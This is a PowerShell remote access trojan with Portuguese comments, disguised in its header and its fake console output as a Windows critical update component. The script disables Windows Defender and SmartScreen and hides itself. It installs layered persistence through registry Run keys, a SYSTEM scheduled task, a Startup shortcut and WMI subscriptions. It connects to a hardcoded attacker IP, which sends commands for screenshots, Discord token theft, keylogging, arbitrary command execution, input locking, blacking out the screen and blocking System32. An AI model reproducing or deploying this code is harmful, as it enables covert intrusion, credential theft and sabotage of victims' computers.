<#
.SYNOPSIS
Windows Critical System Component
.DESCRIPTION
Microsoft Windows Critical Update Module
.NOTES
Version: 10.0.19045.1
#>

# ===== CONFIGURACOES =====
$serverIP = "198.1.195.194"  # ⚠️ MUDE PARA SEU IP
$serverPort = 4000
$installName = "WinUpdateSvc"
$mutexName = "Global\MicrosoftWindowsUpdateService"
$userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"

# ===== MUTEX =====
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) { exit }

# ===== VERIFICAR ADMIN =====
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    try {
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs
        exit
    } catch {
    }
}

# ===== LOGS FAKES =====
Write-Host ""
Write-Host "==================================================================" -ForegroundColor Cyan
Write-Host "    Microsoft Windows Critical System Component" -ForegroundColor Cyan
Write-Host "    Version 10.0.19045.1" -ForegroundColor Cyan
Write-Host "==================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "===============================================================" -ForegroundColor White
Write-Host "SISTEMA: $env:COMPUTERNAME@$env:USERNAME" -ForegroundColor Gray
Write-Host "OS: Microsoft Windows 10 Pro" -ForegroundColor Gray
Write-Host "CPU: $(Get-WmiObject Win32_Processor | Select-Object -ExpandProperty Name)" -ForegroundColor Gray
$totalRAM = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
Write-Host "RAM: $totalRAM GB" -ForegroundColor Gray
$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "127.*" } | Select-Object -First 1).IPAddress
Write-Host "IP: $ip" -ForegroundColor Gray
Write-Host "Admin: $isAdmin" -ForegroundColor $(if($isAdmin){"Green"}else{"Yellow"})
Write-Host "===============================================================" -ForegroundColor White
Start-Sleep -Seconds 1

# ===== DESABILITAR WINDOWS DEFENDER =====
if ($isAdmin) {
    Write-Host "[+] Desabilitando Windows Defender..." -ForegroundColor Yellow
    
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
        Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
        Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
        
        New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force -ErrorAction SilentlyContinue | Out-Null
        New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force -ErrorAction SilentlyContinue | Out-Null
        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
        
        New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Force -ErrorAction SilentlyContinue | Out-Null
        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
        
        New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Force -ErrorAction SilentlyContinue | Out-Null
        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
        
        Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Windows\Caches" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
        
        Write-Host "[OK] Windows Defender desabilitado" -ForegroundColor Green
    } catch {
        Write-Host "[!] Erro ao desabilitar Defender: $_" -ForegroundColor Red
    }
} else {
    Write-Host "[!] Sem privilégios de Admin - Defender não pode ser desabilitado completamente" -ForegroundColor Yellow
}

Start-Sleep -Seconds 1

# ===== ESCONDE JANELA =====
Add-Type -Name Window -Namespace Console -MemberDefinition @'
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("User32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# ===== PERSISTÊNCIA AVANÇADA =====
$scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"

Write-Host "[+] Configurando persistência..." -ForegroundColor Yellow

New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null

if ($MyInvocation.MyCommand.Path -ne $scriptPath) {
    Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force -ErrorAction SilentlyContinue
}

try {
    $regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
    
    if ($isAdmin) {
        $regPathLM = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPathLM -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
    }
    
    Write-Host "[OK] Persistência Registry configurada" -ForegroundColor Green
} catch {
    Write-Host "[!] Erro no Registry: $_" -ForegroundColor Red
}

if ($isAdmin) {
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
        
        $trigger1 = New-ScheduledTaskTrigger -AtLogOn
        $trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration (New-TimeSpan -Days 365)
        $trigger3 = New-ScheduledTaskTrigger -AtStartup
        
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd
        
        Unregister-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Confirm:$false -ErrorAction SilentlyContinue
        Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1,$trigger2,$trigger3 -Principal $principal -Settings $settings -Force | Out-Null
        
        Write-Host "[OK] Task Scheduler configurado" -ForegroundColor Green
    } catch {
        Write-Host "[!] Erro no Task Scheduler: $_" -ForegroundColor Red
    }
}

try {
    $startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $lnkPath = "$startupFolder\WindowsUpdate.lnk"
    
    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($lnkPath)
    $Shortcut.TargetPath = "powershell.exe"
    $Shortcut.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
    $Shortcut.WindowStyle = 7
    $Shortcut.Save()
    
    (Get-Item $lnkPath -Force).Attributes = 'Hidden'
    
    Write-Host "[OK] Startup Folder configurado" -ForegroundColor Green
} catch {
    Write-Host "[!] Erro no Startup Folder: $_" -ForegroundColor Red
}

if ($isAdmin) {
    try {
        $filterName = "WindowsUpdateFilter"
        $consumerName = "WindowsUpdateConsumer"
        
        Get-WmiObject __eventFilter -namespace root\subscription -filter "name='$filterName'" -ErrorAction SilentlyContinue | Remove-WmiObject
        Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='$consumerName'" -ErrorAction SilentlyContinue | Remove-WmiObject
        Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.Filter -like "*$filterName*" } -ErrorAction SilentlyContinue | Remove-WmiObject
        
        $query = "SELECT * FROM __InstanceModificationEvent WITHIN 900 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
        $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{
            Name = $filterName
            EventNameSpace = 'root\cimv2'
            QueryLanguage = "WQL"
            Query = $query
        }
        
        $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
            Name = $consumerName
            CommandLineTemplate = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
        }
        
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
            Filter = $WMIEventFilter
            Consumer = $WMIEventConsumer
        } | Out-Null
        
        Write-Host "[OK] WMI Event Subscription configurado" -ForegroundColor Green
    } catch {
        Write-Host "[!] Erro no WMI: $_" -ForegroundColor Red
    }
}

Start-Sleep -Milliseconds 500
attrib +h +s +r $scriptPath 2>$null

Write-Host "[OK] Persistência completa configurada" -ForegroundColor Green
Start-Sleep -Seconds 1

# ===== FUNÇÕES BASICAS =====
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# ===== FUNÇÕES DE USUÁRIO =====
function Get-RATUsers {
    $users = @()
    if (Test-Path $userListFile) {
        $users = Get-Content $userListFile -ErrorAction SilentlyContinue
    }
    if ($users.Count -eq 0) { return "Nenhum usuário encontrado" }
    return "USUARIOS:" + ($users -join "`n")
}

function Add-UserToList {
    param([string]$UserName)
    New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
    Add-Content -Path $userListFile -Value $UserName -Force
    return $true
}

$currentUser = "$env:COMPUTERNAME@$env:USERNAME"
if (-not (Test-Path $userListFile)) {
    Add-UserToList $currentUser
} else {
    $users = Get-Content $userListFile -ErrorAction SilentlyContinue
    if ($users -notcontains $currentUser) {
        Add-UserToList $currentUser
    }
}

# ===== DESABILITAR ANTIVIRUS (COMANDO) =====
function Disable-Antivirus {
    if (-not $isAdmin) {
        return "ANTIVIRUS_DISABLE_ERROR: Requer privilégios de administrador"
    }
    
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
        
        New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force -ErrorAction SilentlyContinue | Out-Null
        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
        
        Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
        Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
        
        return "ANTIVIRUS_DISABLED"
    } catch {
        return "ANTIVIRUS_DISABLE_ERROR: $_"
    }
}

function Enable-Antivirus {
    if (-not $isAdmin) {
        return "ANTIVIRUS_ENABLE_ERROR: Requer privilégios de administrador"
    }
    
    try {
        Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue
        
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Force -ErrorAction SilentlyContinue
        
        Set-Service -Name WinDefend -StartupType Automatic -ErrorAction SilentlyContinue
        Start-Service -Name WinDefend -ErrorAction SilentlyContinue
        
        return "ANTIVIRUS_ENABLED"
    } catch {
        return "ANTIVIRUS_ENABLE_ERROR: $_"
    }
}

# ===== CAPTURA DE TELA =====
function Get-ScreenCapture {
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $graphics.Dispose()
        $bitmap.Dispose()
        $base64 = [Convert]::ToBase64String($ms.ToArray())
        $ms.Dispose()
        return "SCREEN:$base64"
    } catch {
        return "SCREEN_ERROR"
    }
}

# ===== MOUSE =====
$mouseLockScript = $null

function Lock-Mouse {
    $global:mouseLockScript = {
        Add-Type -AssemblyName System.Windows.Forms
        while ($true) {
            [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
            Start-Sleep -Milliseconds 10
        }
    }
    Start-Job -ScriptBlock $global:mouseLockScript | Out-Null
    return "MOUSE_LOCKED"
}

function Unlock-Mouse {
    Get-Job | Where-Object { $_.State -eq 'Running' } | Stop-Job
    Get-Job | Remove-Job -Force
    return "MOUSE_UNLOCKED"
}

function Move-Mouse {
    param($x, $y)
    try {
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]$x, [int]$y)
        return "OK"
    } catch {
        return "MOUSE_ERROR"
    }
}

function Click-Mouse {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $signature = @'
[DllImport("user32.dll",CharSet=CharSet.Auto, CallingConvention=CallingConvention.StdCall)]
public static extern void mouse_event(long dwFlags, long dx, long dy, long cButtons, long dwExtraInfo);
'@
        $SendMouseClick = Add-Type -memberDefinition $signature -name "Win32MouseEventNew" -namespace Win32Functions -passThru
        $SendMouseClick::mouse_event(0x00000002, 0, 0, 0, 0)
        $SendMouseClick::mouse_event(0x00000004, 0, 0, 0, 0)
        return "OK"
    } catch {
        return "CLICK_ERROR: $_"
    }
}

function Click-RightMouse {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $signature = @'
[DllImport("user32.dll",CharSet=CharSet.Auto, CallingConvention=CallingConvention.StdCall)]
public static extern void mouse_event(long dwFlags, long dx, long dy, long cButtons, long dwExtraInfo);
'@
        $SendMouseClick = Add-Type -memberDefinition $signature -name "Win32MouseEventRight" -namespace Win32Functions -passThru
        $SendMouseClick::mouse_event(0x00000008, 0, 0, 0, 0)
        $SendMouseClick::mouse_event(0x00000010, 0, 0, 0, 0)
        return "OK"
    } catch {
        return "RIGHTCLICK_ERROR: $_"
    }
}

# ===== TECLADO =====
$keyboardLockScript = $null

function Lock-Keyboard {
    $global:keyboardLockScript = {
        Add-Type -AssemblyName System.Windows.Forms
        while ($true) {
            [System.Windows.Forms.SendKeys]::SendWait("{ESC}")
            Start-Sleep -Milliseconds 100
        }
    }
    Start-Job -ScriptBlock $global:keyboardLockScript | Out-Null
    return "KEYBOARD_LOCKED"
}

function Unlock-Keyboard {
    Get-Job | Where-Object { $_.State -eq 'Running' } | Stop-Job
    Get-Job | Remove-Job -Force
    return "KEYBOARD_UNLOCKED"
}

function Send-Key {
    param($key)
    try {
        [System.Windows.Forms.SendKeys]::SendWait($key)
        return "OK"
    } catch {
        return "KEY_ERROR"
    }
}

# ===== TELA PRETA =====
$blackScreenForm = $null

function Enable-BlackScreen {
    try {
        $global:blackScreenForm = New-Object System.Windows.Forms.Form
        $global:blackScreenForm.WindowState = 'Maximized'
        $global:blackScreenForm.FormBorderStyle = 'None'
        $global:blackScreenForm.TopMost = $true
        $global:blackScreenForm.BackColor = 'Black'
        $global:blackScreenForm.ControlBox = $false
        $global:blackScreenForm.ShowInTaskbar = $false
        $global:blackScreenForm.KeyPreview = $true
        $global:blackScreenForm.Add_KeyDown({ $_.SuppressKeyPress = $true })
        
        $rs = [runspacefactory]::CreateRunspace()
        $rs.ApartmentState = "STA"
        $rs.ThreadOptions = "ReuseThread"
        $rs.Open()
        $ps = [powershell]::Create()
        $ps.Runspace = $rs
        $ps.AddScript({
            param($form)
            $form.ShowDialog()
        }).AddArgument($global:blackScreenForm)
        $ps.BeginInvoke()
        
        return "BLACK_SCREEN_ACTIVATED"
    } catch {
        return "BLACK_SCREEN_ERROR: $_"
    }
}

function Disable-BlackScreen {
    try {
        if ($global:blackScreenForm) {
            $global:blackScreenForm.Close()
            $global:blackScreenForm.Dispose()
            $global:blackScreenForm = $null
        }
        [System.Windows.Forms.Application]::OpenForms | Where-Object { 
            $_.BackColor -eq [System.Drawing.Color]::Black -and $_.WindowState -eq 'Maximized' 
        } | ForEach-Object {
            $_.Close()
            $_.Dispose()
        }
        return "BLACK_SCREEN_DEACTIVATED"
    } catch {
        return "UNLOCK_ERROR: $_"
    }
}

# ===== SYSTEM32 =====
function Block-System32 {
    try {
        $system32 = "$env:SystemRoot\System32"
        $acl = Get-Acl $system32
        $rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
            $env:USERNAME, "FullControl", "Deny"
        )
        $acl.AddAccessRule($rule)
        Set-Acl $system32 $acl
        return "SYSTEM32_BLOCKED"
    } catch {
        return "BLOCK_ERROR: $_"
    }
}

function Unblock-System32 {
    try {
        $system32 = "$env:SystemRoot\System32"
        $acl = Get-Acl $system32
        $rules = $acl.Access | Where-Object { $_.IdentityReference -eq "$env:USERDOMAIN\$env:USERNAME" -and $_.AccessControlType -eq "Deny" }
        foreach ($rule in $rules) {
            $acl.RemoveAccessRule($rule) | Out-Null
        }
        Set-Acl $system32 $acl
        return "SYSTEM32_UNBLOCKED"
    } catch {
        return "UNBLOCK_ERROR: $_"
    }
}

# ===== DISCORD =====
function Get-DiscordToken {
    try {
        $tokens = @()
        $paths = @(
            "$env:APPDATA\discord\Local Storage\leveldb",
            "$env:APPDATA\discordcanary\Local Storage\leveldb",
            "$env:APPDATA\discordptb\Local Storage\leveldb"
        )
        
        foreach ($path in $paths) {
            if (Test-Path $path) {
                Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                    $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}')
                    $matches = $regex.Matches($content)
                    foreach ($match in $matches) { 
                        $tokens += $match.Value 
                    }
                }
            }
        }
        
        $tokens = $tokens | Select-Object -Unique
        if ($tokens.Count -eq 0) { return "TOKENS:Nenhum token encontrado" }
        return "TOKENS:" + ($tokens -join "`n")
    } catch {
        return "TOKENS_ERROR: $_"
    }
}

# ===== PROCESSOS =====
function Get-ProcessList {
    try {
        $processes = Get-Process | Select-Object -First 50 Name, Id, @{N="Memory";E={[math]::Round($_.WorkingSet64/1MB,2)}} | 
            ForEach-Object { "$($_.Name)|$($_.Id)|$($_.Memory) MB" }
        return "PROCESSES:" + ($processes -join "`n")
    } catch {
        return "PROCESS_ERROR: $_"
    }
}

function Kill-ProcessByPID {
    param($PID)
    try {
        Stop-Process -Id $PID -Force
        return "PROCESS_KILLED:$PID"
    } catch {
        return "KILL_ERROR: $_"
    }
}

# ===== ARQUIVOS =====
function Get-FileList {
    param($Path)
    try {
        if (-not (Test-Path $Path)) { return "PATH_NOT_FOUND" }
        
        $items = Get-ChildItem $Path -Force -ErrorAction SilentlyContinue | Select-Object -First 100
        $list = @()
        
        foreach ($item in $items) {
            $type = if ($item.PSIsContainer) { "DIR" } else { "FILE" }
            $size = if ($item.PSIsContainer) { "-" } else { [math]::Round($item.Length/1KB, 2).ToString() + " KB" }
            $modified = $item.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
            $list += "$($item.Name)|$type|$size|$modified"
        }
        
        if ($list.Count -eq 0) { return "FILES:EMPTY" }
        return "FILES:" + ($list -join "`n")
    } catch {
        return "FILES_ERROR: $_"
    }
}

# ===== COMANDOS =====
function Execute-Command {
    param($Cmd)
    try {
        $result = Invoke-Expression $Cmd 2>&1 | Out-String
        if ([string]::IsNullOrWhiteSpace($result)) { $result = "Comando executado (sem saída)" }
        return $result
    } catch {
        return "Erro: $_"
    }
}

# ===== ENERGIA =====
function Power-Control {
    param($Action)
    try {
        switch ($Action) {
            "shutdown" { Stop-Computer -Force }
            "reboot" { Restart-Computer -Force }
        }
        return "POWER_$Action"
    } catch {
        return "POWER_ERROR: $_"
    }
}

# ===== KEYLOGGER =====
$keyloggerActive = $false
$keyloggerJob = $null

function Start-Keylogger {
    if ($global:keyloggerActive) { return "KEYLOGGER_ALREADY_RUNNING" }
    
    $global:keyloggerActive = $true
    $global:keyloggerJob = Start-Job -ScriptBlock {
        $code = @'
[DllImport("user32.dll")]
public static extern int GetAsyncKeyState(Int32 i);
'@
        Add-Type -MemberDefinition $code -Name Keyboard -Namespace Win32
        
        $keys = ""
        while ($true) {
            Start-Sleep -Milliseconds 50
            for ($i = 8; $i -le 190; $i++) {
                if ([Win32.Keyboard]::GetAsyncKeyState($i) -eq -32767) {
                    $key = [System.Enum]::GetName([System.Windows.Forms.Keys], $i)
                    $keys += "[$key]"
                }
            }
        }
    }
    return "KEYLOGGER_STARTED"
}

function Stop-Keylogger {
    if (-not $global:keyloggerActive) { return "KEYLOGGER_NOT_RUNNING" }
    
    $global:keyloggerActive = $false
    if ($global:keyloggerJob) {
        Stop-Job -Job $global:keyloggerJob
        Remove-Job -Job $global:keyloggerJob -Force
    }
    return "KEYLOGGER_STOPPED"
}

# ===== DESINSTALAR =====
function Uninstall-RAT {
    try {
        Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -ErrorAction SilentlyContinue
        
        if ($isAdmin) {
            Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -ErrorAction SilentlyContinue
        }
        
        if ($isAdmin) {
            Unregister-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Confirm:$false -ErrorAction SilentlyContinue
        }
        
        $startupLnk = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.lnk"
        Remove-Item $startupLnk -Force -ErrorAction SilentlyContinue
        
        if ($isAdmin) {
            Get-WmiObject __eventFilter -namespace root\subscription -filter "name='WindowsUpdateFilter'" -ErrorAction SilentlyContinue | Remove-WmiObject
            Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='WindowsUpdateConsumer'" -ErrorAction SilentlyContinue | Remove-WmiObject
            Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.Filter -like "*WindowsUpdateFilter*" } -ErrorAction SilentlyContinue | Remove-WmiObject
        }
        
        attrib -h -s -r $scriptPath 2>$null
        Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
        
        if ($isAdmin) {
            Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
            Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Force -ErrorAction SilentlyContinue
            Set-Service -Name WinDefend -StartupType Automatic -ErrorAction SilentlyContinue
            Start-Service -Name WinDefend -ErrorAction SilentlyContinue
        }
        
        exit
    } catch {
        return "UNINSTALL_ERROR: $_"
    }
}

# ===== CONEXAO PRINCIPAL =====
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient($serverIP, $serverPort)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        
        $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
        
        while ($client.Connected) {
            $cmd = $reader.ReadLine()
            if ([string]::IsNullOrEmpty($cmd)) { continue }
            
            switch -Wildcard ($cmd) {
                "test" { $writer.WriteLine("PONG") }
                "screenshot" { $writer.WriteLine((Get-ScreenCapture)) }
                "click" { $writer.WriteLine((Click-Mouse)) }
                "rightclick" { $writer.WriteLine((Click-RightMouse)) }
                "discord" { $writer.WriteLine((Get-DiscordToken)) }
                "processes" { $writer.WriteLine((Get-ProcessList)) }
                "shutdown" { $writer.WriteLine((Power-Control "shutdown")) }
                "reboot" { $writer.WriteLine((Power-Control "reboot")) }
                "list_users" { $writer.WriteLine((Get-RATUsers)) }
                "lock_mouse" { $writer.WriteLine((Lock-Mouse)) }
                "unlock_mouse" { $writer.WriteLine((Unlock-Mouse)) }
                "lock_keyboard" { $writer.WriteLine((Lock-Keyboard)) }
                "unlock_keyboard" { $writer.WriteLine((Unlock-Keyboard)) }
                "black_screen" { $writer.WriteLine((Enable-BlackScreen)) }
                "unlock_screen" { $writer.WriteLine((Disable-BlackScreen)) }
                "block_system32" { $writer.WriteLine((Block-System32)) }
                "unblock_system32" { $writer.WriteLine((Unblock-System32)) }
                "keylog_start" { $writer.WriteLine((Start-Keylogger)) }
                "keylog_stop" { $writer.WriteLine((Stop-Keylogger)) }
                "disable_antivirus" { $writer.WriteLine((Disable-Antivirus)) }
                "enable_antivirus" { $writer.WriteLine((Enable-Antivirus)) }
                "uninstall" { $writer.WriteLine((Uninstall-RAT)) }
                "exit" { break }
                "move *" { 
                    $parts = $cmd -split " "
                    $writer.WriteLine((Move-Mouse $parts[1] $parts[2]))
                }
                "key *" { 
                    $key = $cmd.Substring(4)
                    $writer.WriteLine((Send-Key $key))
                }
                "exec *" { 
                    $command = $cmd.Substring(5)
                    $writer.WriteLine((Execute-Command $command))
                }
                "kill *" {
                    $pid = $cmd.Substring(5)
                    $writer.WriteLine((Kill-ProcessByPID $pid))
                }
                "list_files *" {
                    $path = $cmd.Substring(11)
                    $writer.WriteLine((Get-FileList $path))
                }
                "msgbox *" {
                    $msg = $cmd.Substring(7)
                    [System.Windows.Forms.MessageBox]::Show($msg, "Aviso", 0, 48)
                    $writer.WriteLine("MSGBOX_SHOWN")
                }
                default { 
                    $writer.WriteLine("Comando não reconhecido: $cmd") 
                }
            }
        }
    } catch {
        Start-Sleep -Seconds 10
    } finally {
        if ($client) { $client.Close() }
    }
}

$mutex.ReleaseMutex()
$mutex.Dispose()
